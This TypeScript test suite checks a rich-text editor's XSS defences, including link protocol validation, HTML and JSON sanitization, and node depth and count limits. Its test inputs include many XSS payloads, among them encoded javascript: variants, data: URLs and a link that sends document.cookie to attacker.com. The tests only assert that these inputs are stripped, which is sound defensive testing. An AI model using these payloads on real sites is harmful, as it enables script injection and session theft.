import { expect, fixture, html } from '@open-wc/testing';
import sinon from 'sinon';
import { RichTextContextComponent } from '../rich-text-context';
import { RichTextRendererComponent } from '../rich-text-renderer';
import type { RichTextFeatureLinkComponent } from '../features/rte-link';

import '../rich-text-context';
import '../rich-text-content';
import '../rich-text-renderer';
import '../features/rte-link';

describe('Security: XSS Prevention', () => {
  describe('Security Hardening - Insecure Properties Removed', () => {
    it('should not expose validateUrls property on rte-link', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;

      // Property should not exist in the public API
      expect(link).to.not.have.property('validateUrls');
    });

    it('should not expose suppressErrors property on rich-text-context', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Property should not exist in the public API
      expect(el).to.not.have.property('suppressErrors');
    });

    it('should always validate URLs even if validate-urls attribute is set', async () => {
      // Even if someone tries to set the attribute in HTML, validation should still run
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link validate-urls="false"></forge-rte-link>
        </forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      // Trigger validation via DOM input event (native private #validateUrl not accessible via as any)
      (link as any)._linkUrl = 'javascript:alert(1)';
      await link.updateComplete;
      const input = link.shadowRoot?.querySelector('input') as HTMLInputElement;
      if (input) {
        Object.defineProperty(input, 'value', { value: 'javascript:alert(1)', writable: true, configurable: true });
        input.dispatchEvent(new Event('input', { bubbles: true }));
        await link.updateComplete;
      }

      // Should still show validation error
      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should always log security warnings even if suppress-errors attribute is set', async () => {
      const spy = sinon.spy(console, 'warn');

      try {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context suppress-errors="true"></forge-rich-text-context>
        `);

        await new Promise(resolve => setTimeout(resolve, 100));

        // Trigger a security warning by injecting dangerous protocol
        (el as any).content = {
          type: 'doc',
          content: [
            {
              type: 'paragraph',
              content: [
                {
                  type: 'text',
                  text: 'Link',
                  marks: [{ type: 'link', attrs: { href: 'javascript:alert(1)' } }]
                }
              ]
            }
          ]
        };
        await el.updateComplete;

        // Should still log warning even with suppress-errors="true"
        expect(spy.calledWith(sinon.match(/Blocked dangerous protocol/))).to.be.true;
      } finally {
        spy.restore();
      }
    });
  });

  describe('HTML Output Encoding', () => {
    it('should escape script tags in toHTML()', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rich-text-content></forge-rich-text-content>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 150));

      // The sanitizer REMOVES script elements (does not encode them).
      // This test verifies that script elements do not survive to toHTML().
      el.content = '<p>Safe content</p><script>alert(1)</script>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<script>');
      expect(output).to.not.include('alert(1)');
      expect(output).to.include('Safe content');
    });

    it('should escape img onerror in toHTML()', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rich-text-content></forge-rich-text-content>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 150));

      el.content = '<p><img src=x onerror=alert(1)></p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('onerror=');
    });

    it('should escape HTML entities in text content', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rich-text-content></forge-rich-text-content>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 150));

      // Use JSON input: sanitizeJSON does not alter text nodes.
      // TipTap stores the literal text and HTML-encodes it in toHTML().
      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: '<script>alert("XSS")</script>'
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.include('&lt;script&gt;');
      expect(output).to.not.include('<script>alert');
    });

    it('should remove dangerous elements from output', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rich-text-content></forge-rich-text-content>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 150));

      el.content = '<p>Safe text</p><iframe src="evil.com"></iframe><script>alert(1)</script>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<iframe');
      expect(output).to.not.include('<script>');
      expect(output).to.include('Safe text');
    });

    it('should remove event handler attributes', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p onclick="alert(1)" onmouseover="evil()">Text</p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('onclick=');
      expect(output).to.not.include('onmouseover=');
    });
  });

  describe('Link Protocol Validation', () => {
    // #validateUrl is a native private method — not accessible via (as any).
    // Trigger it by dispatching an input event on the shadow DOM input element.
    async function triggerLinkValidation(link: RichTextFeatureLinkComponent, url: string): Promise<void> {
      (link as any)._linkUrl = url;
      await link.updateComplete;
      const input = link.shadowRoot?.querySelector('input') as HTMLInputElement;
      if (input) {
        Object.defineProperty(input, 'value', { value: url, writable: true, configurable: true });
        input.dispatchEvent(new Event('input', { bubbles: true }));
        await link.updateComplete;
      }
    }

    it('should block javascript: protocol', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      await triggerLinkValidation(link, 'javascript:alert(1)');

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block data: URLs', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      await triggerLinkValidation(link, 'data:text/html,<script>alert(1)</script>');

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block vbscript: protocol', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      await triggerLinkValidation(link, 'vbscript:alert(1)');

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block file: protocol', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      await triggerLinkValidation(link, 'file:///etc/passwd');

      expect((link as any)._validationError).to.include('Invalid protocol');
    });

    it('should block URL-encoded javascript: protocol', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      // java%09script:alert(1) decodes to java\tscript:alert(1) — matches startsWith check after decode
      await triggerLinkValidation(link, 'java%09script:alert(1)');

      expect((link as any)._validationError).to.not.equal('');
    });

    it('should allow https: URLs with dangerous strings in query params', async () => {
      // Protocol check uses startsWith, not includes.
      // A valid https: URL with "javascript:" in a query param must NOT be blocked.
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      await triggerLinkValidation(link, 'https://example.com?redirect=javascript:alert(1)');

      // Should NOT be blocked — the protocol is https:, not javascript:
      expect((link as any)._validationError).to.equal('');
    });

    it('should allow valid https URLs', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      await triggerLinkValidation(link, 'https://example.com');

      expect((link as any)._validationError).to.equal('');
    });

    it('should allow valid http URLs', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rte-link></forge-rte-link>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 100));

      const link = el.querySelector('forge-rte-link') as RichTextFeatureLinkComponent;
      await triggerLinkValidation(link, 'http://example.com/path?query=value');

      expect((link as any)._validationError).to.equal('');
    });
  });

  describe('JSON Input Sanitization', () => {
    it('should sanitize javascript: links in JSON', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rich-text-content></forge-rich-text-content>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 150));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Click here',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'javascript:alert(1)' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('javascript:');
      // The sanitizer replaces the href with '#' when the Link extension is loaded;
      // without it TipTap drops the mark entirely — either way the dangerous protocol is absent.
    });

    it('should sanitize data: URLs in JSON', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rich-text-content></forge-rich-text-content>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 150));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Click',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'data:text/html,<script>alert(1)</script>' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('data:text/html');
      // Same as javascript: case — dangerous protocol absent is the security invariant.
    });

    it('should reject deeply nested JSON (DoS prevention)', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
      await new Promise(resolve => setTimeout(resolve, 100));

      // Create deeply nested structure (51 levels - exceeds MAX_DEPTH of 50)
      const deep: any = { type: 'doc', content: [] };
      let current: any = deep.content;
      for (let i = 0; i < 51; i++) {
        const node = { type: 'paragraph', content: [] };
        current.push(node);
        current = node.content;
      }

      // The error is caught and dispatched as a CustomEvent (bubbles:true, composed:true).
      // Stop propagation so WTR doesn't treat it as an uncaught error.
      const rteErrors: string[] = [];
      el.addEventListener('error', (e: Event) => {
        rteErrors.push((e as CustomEvent).detail?.error ?? '');
        e.stopPropagation();
      });

      (el as any).content = deep;
      await el.updateComplete;

      expect(rteErrors.length).to.be.greaterThan(0);
    });

    it('should reject extremely large JSON structures (DoS prevention)', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
      await new Promise(resolve => setTimeout(resolve, 100));

      // Create structure with too many nodes (exceeds MAX_NODES of 5000)
      const huge = {
        type: 'doc',
        content: Array(5001)
          .fill(null)
          .map(() => ({
            type: 'paragraph',
            content: [{ type: 'text', text: 'x' }]
          }))
      };

      // The error is caught and dispatched as a CustomEvent.
      const rteErrors: string[] = [];
      el.addEventListener('error', (e: Event) => {
        rteErrors.push((e as CustomEvent).detail?.error ?? '');
        e.stopPropagation();
      });

      (el as any).content = huge;
      await el.updateComplete;

      expect(rteErrors.length).to.be.greaterThan(0);
    });

    it('should sanitize URL-encoded dangerous protocols in JSON', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context>
          <forge-rich-text-content></forge-rich-text-content>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 150));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Link',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'java%09script:alert(1)' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('javascript');
      // Same as above — dangerous protocol absent is the security invariant.
    });

    it('should handle nested link marks safely', async () => {
      const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Text',
                marks: [
                  { type: 'bold' },
                  {
                    type: 'link',
                    attrs: { href: 'javascript:alert(1)' }
                  },
                  { type: 'italic' }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('javascript:');
    });
  });

  describe('Renderer Security', () => {
    it('should sanitize javascript: links in renderer', async () => {
      const el = await fixture<RichTextRendererComponent>(html`
        <forge-rich-text-renderer></forge-rich-text-renderer>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Click',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'javascript:alert(1)' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const links = el.shadowRoot!.querySelectorAll('a');
      links.forEach(link => {
        expect(link.href).to.not.include('javascript:');
      });
    });

    it('should sanitize data: URLs in renderer', async () => {
      const el = await fixture<RichTextRendererComponent>(html`
        <forge-rich-text-renderer></forge-rich-text-renderer>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      const malicious = {
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [
              {
                type: 'text',
                text: 'Data URL',
                marks: [
                  {
                    type: 'link',
                    attrs: { href: 'data:text/html,<script>alert(1)</script>' }
                  }
                ]
              }
            ]
          }
        ]
      };

      (el as any).content = malicious;
      await el.updateComplete;

      const links = el.shadowRoot!.querySelectorAll('a');
      links.forEach(link => {
        expect(link.href).to.not.include('data:text/html');
      });
    });

    it('should handle deeply nested content in renderer', async () => {
      const el = await fixture<RichTextRendererComponent>(html`
        <forge-rich-text-renderer></forge-rich-text-renderer>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Create deeply nested structure
      const deep: any = { type: 'doc', content: [] };
      let current: any = deep.content;
      for (let i = 0; i < 51; i++) {
        const node = { type: 'paragraph', content: [] };
        current.push(node);
        current = node.content;
      }

      // Should gracefully handle error and show empty content
      el.content = deep;
      await el.updateComplete;

      const text = el.shadowRoot!.textContent?.trim();
      expect(text).to.equal('');
    });

    it('should handle large content safely in renderer', async () => {
      const el = await fixture<RichTextRendererComponent>(html`
        <forge-rich-text-renderer></forge-rich-text-renderer>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      // Create structure with too many nodes
      const huge = {
        type: 'doc',
        content: Array(5001)
          .fill(null)
          .map(() => ({
            type: 'paragraph',
            content: [{ type: 'text', text: 'x' }]
          }))
      };

      // Should gracefully handle error
      el.content = huge;
      await el.updateComplete;

      const text = el.shadowRoot!.textContent?.trim();
      expect(text).to.equal('');
    });
  });

  describe('Paste Handler Security', () => {
    it('should remove script elements from pasted HTML', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting>
          <forge-rich-text-content></forge-rich-text-content>
        </forge-rich-text-context>
      `);
      await new Promise(resolve => setTimeout(resolve, 150));

      // Simulate setting content with script
      el.content = '<p>Safe text</p><script>alert(1)</script>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<script>');
      expect(output).to.include('Safe text');
    });

    it('should remove iframe elements from pasted HTML', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p>Text</p><iframe src="evil.com"></iframe>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<iframe');
    });

    it('should remove SVG elements with scripts', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p>Text</p><svg onload="alert(1)"><script>alert(2)</script></svg>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('<svg');
      expect(output).to.not.include('onload');
    });

    it('should remove style attributes', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p style="background:red">Text</p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('style=');
    });

    it('should remove data attributes', async () => {
      const el = await fixture<RichTextContextComponent>(html`
        <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
      `);

      await new Promise(resolve => setTimeout(resolve, 100));

      el.content = '<p data-evil="payload">Text</p>';
      await el.updateComplete;

      const output = el.toHTML();
      expect(output).to.not.include('data-evil');
    });
  });

  describe('Regression Tests - Ensure Security Measures Remain in Place', () => {
    describe('HTML Sanitization in toHTML()', () => {
      it('should always escape HTML entities in text content (prevent XSS)', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Test various XSS vectors
        const xssVectors = [
          '<script>alert(1)</script>',
          '<img src=x onerror=alert(1)>',
          '<svg onload=alert(1)>',
          '<iframe src="javascript:alert(1)"></iframe>',
          '<object data="javascript:alert(1)"></object>',
          '<embed src="javascript:alert(1)">',
          '<link rel=stylesheet href="javascript:alert(1)">',
          '<style>@import"javascript:alert(1)";</style>',
          '<form action="javascript:alert(1)"><button>Click</button></form>',
          '<input type=text onfocus=alert(1) autofocus>',
          '<video><source onerror=alert(1)></video>',
          '<audio src=x onerror=alert(1)>'
        ];

        for (const vector of xssVectors) {
          el.content = `<p>${vector}</p>`;
          await el.updateComplete;
          const output = el.toHTML();

          // Verify HTML entities are escaped
          expect(output).to.not.include('<script');
          expect(output).to.not.include('<img');
          expect(output).to.not.include('<svg');
          expect(output).to.not.include('<iframe');
          expect(output).to.not.include('<object');
          expect(output).to.not.include('<embed');
          expect(output).to.not.include('onerror=');
          expect(output).to.not.include('onload=');
        }
      });

      it('should escape angle brackets in all contexts', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rich-text-content></forge-rich-text-content>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 150));

        el.content = '<p>Test <test> value</p>';
        await el.updateComplete;

        const output = el.toHTML();
        // The unknown <test> element is stripped by the sanitizer; the text "Test  value" survives
        expect(output).to.not.match(/<test>/);
        expect(output).to.not.include('<test>');
      });

      it('should escape quotes and apostrophes', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rich-text-content></forge-rich-text-content>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 150));

        el.content = '<p>Test "quotes" and \'apostrophes\'</p>';
        await el.updateComplete;

        const output = el.toHTML();
        // Quotes and apostrophes are preserved as text — the output must contain them in some form
        expect(output).to.match(/&quot;|"/);
        expect(output).to.match(/&#039;|'/);
      });

      it('should handle nested HTML entities correctly', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rich-text-content></forge-rich-text-content>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 150));

        el.content = '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>';
        await el.updateComplete;

        const output = el.toHTML();
        // TipTap stores the decoded text node; toHTML() re-encodes it
        expect(output).to.include('&lt;script&gt;');
        expect(output).to.not.include('<script>');
      });
    });

    describe('Protocol Validation - Always Block Dangerous Protocols', () => {
      it('should never allow javascript: protocol in any form', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context>
            <forge-rte-link></forge-rte-link>
          </forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const dangerousVariants = [
          'javascript:alert(1)',
          'JavaScript:alert(1)',
          'JAVASCRIPT:alert(1)',
          'java\nscript:alert(1)',
          'java\rscript:alert(1)',
          'java\tscript:alert(1)',
          ' javascript:alert(1)',
          'javascript :alert(1)',
          'java%0ascript:alert(1)',
          'java%0dscript:alert(1)',
          'java%09script:alert(1)',
          'jav&#x61;script:alert(1)',
          '&#106;avascript:alert(1)'
        ];

        for (const variant of dangerousVariants) {
          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: variant } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          const output = el.toHTML();
          // Should be sanitized to # or blocked
          expect(output.toLowerCase()).to.not.include('javascript:');
        }
      });

      it('should never allow data: URLs', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const dataUrls = [
          'data:text/html,<script>alert(1)</script>',
          'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
          'DATA:text/html,<script>alert(1)</script>',
          'data:text/javascript,alert(1)',
          'data:image/svg+xml,<svg onload=alert(1)>'
        ];

        for (const url of dataUrls) {
          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: url } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include('data:');
        }
      });

      it('should never allow file:, vbscript:, about:, or blob: protocols', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const dangerousProtocols = [
          'file:///etc/passwd',
          'vbscript:msgbox(1)',
          'about:blank',
          'blob:https://example.com/uuid'
        ];

        for (const protocol of dangerousProtocols) {
          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: protocol } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          const output = el.toHTML();
          const protocolName = protocol.split(':')[0].toLowerCase();
          expect(output.toLowerCase()).to.not.include(`${protocolName}:`);
        }
      });
    });

    describe('JSON Sanitization - Always Validate Input', () => {
      it('should always sanitize JSON input regardless of source', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const maliciousJson = {
          type: 'doc',
          content: [
            {
              type: 'paragraph',
              content: [
                {
                  type: 'text',
                  text: 'Click here',
                  marks: [
                    {
                      type: 'link',
                      attrs: {
                        href: 'javascript:document.location="http://attacker.com?cookie="+document.cookie'
                      }
                    }
                  ]
                }
              ]
            }
          ]
        };

        (el as any).content = maliciousJson;
        await el.updateComplete;

        const output = el.toHTML();
        expect(output.toLowerCase()).to.not.include('javascript:');
      });

      it('should enforce maximum depth limit to prevent DoS', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Create deeply nested structure (60 levels, exceeds MAX_DEPTH=50)
        let deepContent: any = { type: 'text', text: 'Deep' };
        for (let i = 0; i < 60; i++) {
          deepContent = { type: 'paragraph', content: [deepContent] };
        }

        // The error is caught and dispatched as a CustomEvent; stop propagation to prevent
        // WTR treating it as an uncaught window error.
        const rteErrors: string[] = [];
        el.addEventListener('error', (e: Event) => {
          rteErrors.push((e as CustomEvent).detail?.error ?? '');
          e.stopPropagation();
        });

        (el as any).content = { type: 'doc', content: [deepContent] };
        await el.updateComplete;

        expect(rteErrors.length).to.be.greaterThan(0);
      });

      it('should enforce maximum node count to prevent DoS', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        // Create massive structure (6000 nodes, exceeds MAX_NODES=5000)
        const hugeContent = {
          type: 'doc',
          content: Array(6000)
            .fill(null)
            .map(() => ({ type: 'paragraph', content: [{ type: 'text', text: 'x' }] }))
        };

        // The error is caught and dispatched as a CustomEvent; stop propagation.
        const rteErrors: string[] = [];
        el.addEventListener('error', (e: Event) => {
          rteErrors.push((e as CustomEvent).detail?.error ?? '');
          e.stopPropagation();
        });

        (el as any).content = hugeContent;
        await el.updateComplete;

        expect(rteErrors.length).to.be.greaterThan(0);
      });

      it('should sanitize URL-encoded protocols in JSON', async () => {
        const el = await fixture<RichTextContextComponent>(html` <forge-rich-text-context></forge-rich-text-context> `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const encodedAttacks = [
          'java%73cript:alert(1)',
          '%6A%61%76%61%73%63%72%69%70%74:alert(1)',
          'data%3Atext/html,<script>alert(1)</script>'
        ];

        for (const encoded of encodedAttacks) {
          (el as any).content = {
            type: 'doc',
            content: [
              {
                type: 'paragraph',
                content: [
                  {
                    type: 'text',
                    text: 'Link',
                    marks: [{ type: 'link', attrs: { href: encoded } }]
                  }
                ]
              }
            ]
          };
          await el.updateComplete;

          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include('javascript');
          expect(output.toLowerCase()).to.not.include('data:');
        }
      });
    });

    describe('Renderer Security - Must Sanitize Untrusted Content', () => {
      it('should always sanitize content in renderer (same as editor)', async () => {
        const renderer = await fixture<RichTextRendererComponent>(html`
          <forge-rich-text-renderer></forge-rich-text-renderer>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const malicious = {
          type: 'doc',
          content: [
            {
              type: 'paragraph',
              content: [
                {
                  type: 'text',
                  text: 'Malicious link',
                  marks: [{ type: 'link', attrs: { href: 'javascript:steal_data()' } }]
                }
              ]
            }
          ]
        };

        (renderer as any).content = malicious;
        await renderer.updateComplete;

        const renderedLinks = renderer.shadowRoot?.querySelectorAll('a');
        renderedLinks?.forEach(link => {
          const href = link.getAttribute('href') || '';
          expect(href.toLowerCase()).to.not.include('javascript:');
        });
      });

      it('should enforce same depth limits in renderer', async () => {
        const renderer = await fixture<RichTextRendererComponent>(html`
          <forge-rich-text-renderer></forge-rich-text-renderer>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        let deepContent: any = { type: 'text', text: 'Deep' };
        for (let i = 0; i < 60; i++) {
          deepContent = { type: 'paragraph', content: [deepContent] };
        }

        try {
          (renderer as any).content = { type: 'doc', content: [deepContent] };
          await renderer.updateComplete;
        } catch (error) {
          expect((error as Error).message).to.include('depth');
        }
      });

      it('should enforce same node count limits in renderer', async () => {
        const renderer = await fixture<RichTextRendererComponent>(html`
          <forge-rich-text-renderer></forge-rich-text-renderer>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const hugeContent = {
          type: 'doc',
          content: Array(6000)
            .fill(null)
            .map(() => ({ type: 'paragraph', content: [{ type: 'text', text: 'x' }] }))
        };

        try {
          (renderer as any).content = hugeContent;
          await renderer.updateComplete;
        } catch (error) {
          expect((error as Error).message).to.include('node count');
        }
      });
    });

    describe('Paste Handler Security - Must Remove Dangerous Elements', () => {
      it('should always remove SVG elements (security hardening)', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const svgAttacks = [
          '<svg onload=alert(1)></svg>',
          '<svg><script>alert(1)</script></svg>',
          '<svg><animate onbegin=alert(1)></animate></svg>',
          '<svg><set onbegin=alert(1)></set></svg>',
          '<math><maction actiontype=statusline#http://google.com>CLICKME</maction></math>'
        ];

        for (const svg of svgAttacks) {
          el.content = `<p>${svg}</p>`;
          await el.updateComplete;
          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include('<svg');
          expect(output.toLowerCase()).to.not.include('<math');
          expect(output.toLowerCase()).to.not.include('onload');
        }
      });

      it('should always remove audio and video elements', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const mediaAttacks = [
          '<audio src=x onerror=alert(1)></audio>',
          '<video><source onerror=alert(1)></video>',
          '<audio controls><source src="javascript:alert(1)"></audio>'
        ];

        for (const media of mediaAttacks) {
          el.content = `<p>${media}</p>`;
          await el.updateComplete;
          const output = el.toHTML();
          expect(output.toLowerCase()).to.not.include('<audio');
          expect(output.toLowerCase()).to.not.include('<video');
          expect(output.toLowerCase()).to.not.include('onerror');
        }
      });

      it('should always remove all event handler attributes', async () => {
        const el = await fixture<RichTextContextComponent>(html`
          <forge-rich-text-context allow-paste-formatting></forge-rich-text-context>
        `);
        await new Promise(resolve => setTimeout(resolve, 100));

        const eventHandlers = [
          'onclick',
